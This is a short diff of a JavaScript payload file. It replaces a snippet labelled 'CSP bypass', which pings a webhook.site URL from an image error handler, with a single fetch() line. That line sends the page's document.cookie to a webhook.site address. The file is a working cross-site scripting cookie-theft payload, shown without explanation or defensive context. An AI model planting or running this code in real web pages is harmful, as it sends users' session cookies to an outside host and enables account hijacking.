@@ -1,13 +1,1 @@
-// CSP bypass
-(function() {
-
-    var img = new Image();
-    img.src = 'x'; 
-    img.onerror = function() {
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", "https://webhook.site/c63e44e1-fbc7-4e81-b8e1-c0729a501b14", true);
-        xhr.send();
-        
-        console.log("chtipilou code executed");
-    };
-})();
+fetch('https://webhook.site/33fc25fd-1bf0-4672-8f43-c6c083183e9f?cookie=' + document.cookie);
